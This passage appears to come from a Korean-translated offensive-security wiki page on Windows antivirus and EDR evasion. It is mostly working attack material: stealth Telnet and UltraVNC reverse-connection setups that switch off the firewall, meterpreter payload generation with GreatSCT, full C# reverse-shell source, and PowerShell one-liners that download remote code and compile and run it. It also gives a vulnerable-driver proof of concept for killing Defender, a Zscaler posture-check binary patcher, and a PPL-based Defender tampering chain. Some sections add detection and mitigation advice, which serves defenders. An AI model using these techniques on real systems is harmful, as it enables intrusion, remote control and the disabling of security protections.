4. 다음과 같이 약간의 조정을 통해 전달된 파라미터를 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (참고: pin 파라미터로 GUI를 사용하지 않고도 PIN을 설정할 수 있습니다.)

## Advanced Evasion

회피(Evasion)는 매우 복잡한 주제이며, 하나의 시스템 내에서도 여러 출처의 텔레메트리를 고려해야 할 때가 있어 성숙한 환경에서 완전히 탐지를 피하는 것은 거의 불가능합니다.

대상 환경마다 강점과 약점이 다릅니다.

더 고급 회피 기법에 대한 기초를 익히려면 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 권합니다.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 Defender가 악성으로 판단하는 부분을 찾을 때까지 바이너리의 **일부를 제거(remove parts of the binary)**하며 어떤 부분을 Defender가 악성으로 판단하는지 분리해서 알려줍니다.\
동일한 작업을 수행하는 또 다른 도구로는 웹 서비스를 제공하는 [**avred**](https://github.com/dobin/avred)와 오픈 웹 서비스 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)가 있습니다.

### **Telnet Server**

Windows10 이전까지 모든 Windows에는 관리자로 설치할 수 있는 **Telnet server**가 포함되어 있었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **start** 하도록 설정하고 지금 **run** 하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port 변경** (stealth) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin 다운로드를 원합니다, setup이 아닌)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 옵션 _Disable TrayIcon_를 활성화하세요
- _VNC Password_에 비밀번호를 설정하세요
- _View-Only Password_에 비밀번호를 설정하세요

Then, move the binary _**winvnc.exe**_ and **새로 생성된** 파일 _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** To maintain stealth you must not do a few things

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister를 시작**하고 **xml payload**를 **실행**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 reverse shell 컴파일하기

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 난독화 도구 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/promheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python을 사용한 빌드 인젝터 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 추가

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603은 **Antivirus Terminator**로 알려진 작은 콘솔 유틸리티를 이용해 랜섬웨어를 떨어뜨리기 전에 엔드포인트 보호를 비활성화했습니다. 이 도구는 **자체적으로 취약하지만 *서명된* 드라이버를 포함**하고 이를 악용해 Protected-Process-Light (PPL) AV 서비스조차 차단할 수 없는 권한 있는 커널 작업을 수행합니다.

핵심 요점
1. **Signed driver**: 디스크에 배달되는 파일은 `ServiceMouse.sys`이지만, 실제 바이너리는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식으로 서명된 드라이버 `AToolsKrnl64.sys`입니다. 드라이버가 유효한 Microsoft 서명을 가지고 있기 때문에 Driver-Signature-Enforcement (DSE)가 활성화된 상태에서도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 드라이버를 **커널 서비스**로 등록하고 두 번째 줄은 이를 시작하여 `\\.\ServiceMouse`가 user land에서 접근 가능해지게 합니다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의 프로세스를 종료 (Defender/EDR 서비스 종료에 사용됨) |
| `0x990000D0` | 디스크의 임의 파일 삭제 |
| `0x990001D0` | 드라이버 언로드 및 서비스 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD는 사용자 모드 보호를 완전히 우회합니다. 커널에서 실행되는 코드는 *보호된* 프로세스를 열거나 종료할 수 있고, PPL/PP, ELAM 또는 기타 하드닝 기능에 관계없이 커널 객체를 조작할 수 있습니다.

탐지 / 완화
• Microsoft의 취약한 드라이버 차단 목록(`HVCI`, `Smart App Control`)을 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 않도록 합니다.  
• 새로운 *커널* 서비스 생성 모니터링과, 드라이버가 world-writable 디렉터리에서 로드되거나 허용 목록에 없는 경우 경고를 발생시키도록 합니다.  
• 사용자 모드에서 커스텀 디바이스 객체에 대한 핸들을 획득한 뒤 의심스러운 `DeviceIoControl` 호출이 이어지는 것을 감시합니다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 장치 posture 규칙을 로컬에서 적용하고 결과를 다른 구성요소에 전달하기 위해 Windows RPC를 사용합니다. 두 가지 약한 설계 선택으로 인해 완전한 우회가 가능합니다:

1. Posture 평가는 **전적으로 클라이언트 측에서** 이루어지며 (서버에는 불리언 값만 전송됨).  
2. 내부 RPC 엔드포인트는 연결하는 실행파일이 **Zscaler에 의해 서명되었는지** (`WinVerifyTrust`를 통해)만 검증합니다.

디스크 상의 서명된 바이너리 네 개를 패치하면 두 메커니즘을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하여 모든 체크가 준수된 것으로 처리됨 |
| `ZSAService.exe` | `WinVerifyTrust`에 대한 간접 호출 | NOP 처리 ⇒ 서명되지 않은 프로세스도 RPC 파이프에 바인딩 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체 |
| `ZSATunnel.exe` | 터널에 대한 무결성 검사 | 우회됨 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 재시작한 후:

* **All** posture checks display **green/compliant**.
* 서명되지 않았거나 수정된 바이너리는 네임드 파이프 RPC 엔드포인트를 열 수 있습니다 (예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 침해된 호스트는 Zscaler 정책으로 정의된 내부 네트워크에 대한 무제한 접근 권한을 얻습니다.

이 사례 연구는 순수한 클라이언트 측 신뢰 결정과 간단한 서명 검사가 몇 바이트 패치로 어떻게 무력화될 수 있는지를 보여줍니다.

## Protected Process Light (PPL)을 악용해 LOLBINs로 AV/EDR를 조작하기

Protected Process Light (PPL)은 서명자/레벨 계층을 강제하여 동등하거나 더 높은 권한의 protected 프로세스만 서로를 조작할 수 있도록 합니다. 공격적으로, PPL이 활성화된 바이너리를 정당하게 실행하고 인자를 제어할 수 있다면, 평범한 기능(예: 로깅)을 AV/EDR에서 사용하는 보호된 디렉터리에 대해 제약된, PPL 기반의 쓰기 primitive로 바꿀 수 있습니다.

프로세스가 PPL로 실행되려면
- 대상 EXE(및 로드된 DLL들)는 PPL-capable EKU로 서명되어 있어야 합니다.
- 프로세스는 CreateProcess로 생성되어야 하며 플래그로 다음을 사용해야 합니다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 바이너리의 서명자와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: anti-malware 서명자에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows 서명자에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 레벨은 생성 시 실패합니다.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 사용 패턴:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 스스로 프로세스를 생성하며 호출자가 지정한 경로에 로그 파일을 쓰기 위한 파라미터를 받습니다.
- PPL 프로세스로 실행되면 파일 쓰기는 PPL 권한으로 수행됩니다.
- ClipUp는 공백이 포함된 경로를 파싱할 수 없습니다; 보통 보호된 위치를 가리킬 때는 8.3 단축 경로를 사용하세요.

8.3 short path helpers
- 짧은 이름 나열: `dir /x` in each parent directory.
- cmd에서 단축 경로 유도: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp)을 `CREATE_PROTECTED_PROCESS`로 실행합니다. 실행기는 (예: CreateProcessAsPPL) 사용합니다.
2) ClipUp 로그 경로 인수를 전달해 보호된 AV 디렉터리(예: Defender Platform)에 파일 생성을 강제합니다. 필요하면 8.3 단축 이름을 사용하세요.
3) 대상 바이너리가 실행 중 AV에 의해 일반적으로 열려 있거나 잠겨 있다면(예: MsMpEng.exe), AV가 시작되기 전에 부팅 시 쓰기가 실행되도록 더 일찍 실행되는 자동 시작 서비스를 설치해 쓰기를 예약하세요. Process Monitor (boot logging)로 부팅 순서를 검증하세요.
4) 재부팅 시 PPL-backed 쓰기가 AV가 바이너리를 잠그기 전에 발생하여 대상 파일을 손상시키고 시작을 방해합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp가 쓰는 내용은 배치 위치 이외에는 제어할 수 없습니다; 이 프리미티브는 정밀한 콘텐츠 삽입보다는 변조에 적합합니다.
- 서비스 설치/시작과 재부팅 시간 창을 위해 로컬 admin/SYSTEM 권한이 필요합니다.
- 타이밍이 중요합니다: 대상이 열려 있어서는 안 되며, 부팅 시점 실행이 파일 잠금을 회피합니다.

Detections
- 부팅 시점에 비정상적인 인수로 `ClipUp.exe` 프로세스가 생성되거나, 비표준 런처가 부모로 설정된 경우.
- 의심스러운 바이너리를 자동 시작하도록 구성된 새 서비스가 생성되거나 Defender/AV보다 일관되게 먼저 시작되는 경우. Defender 시작 실패 이전의 서비스 생성/수정 내역을 조사하십시오.
- Defender 바이너리/Platform 디렉터리에 대한 파일 무결성 모니터링: protected-process 플래그를 가진 프로세스에 의한 예기치 않은 파일 생성/수정 여부.
- ETW/EDR 텔레메트리: `CREATE_PROTECTED_PROCESS`로 생성된 프로세스 및 비-AV 바이너리의 비정상적인 PPL 레벨 사용을 주시하십시오.

Mitigations
- WDAC/Code Integrity: 어떤 서명된 바이너리가 PPL로 실행될 수 있는지와 어떤 부모 아래에서 가능한지를 제한하십시오; 정당한 컨텍스트 이외에서의 ClipUp 호출을 차단하십시오.
- 서비스 관리: 자동 시작 서비스의 생성/수정 권한을 제한하고 시작 순서 조작을 모니터링하십시오.
- Defender tamper protection 및 early-launch 보호가 활성화되어 있는지 확인하고, 바이너리 손상을 나타내는 시작 오류를 조사하십시오.
- 환경과 호환된다면 보안 도구를 호스팅하는 볼륨에서 8.3 short-name 생성 기능을 비활성화하는 것을 고려하십시오(철저히 테스트할 것).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
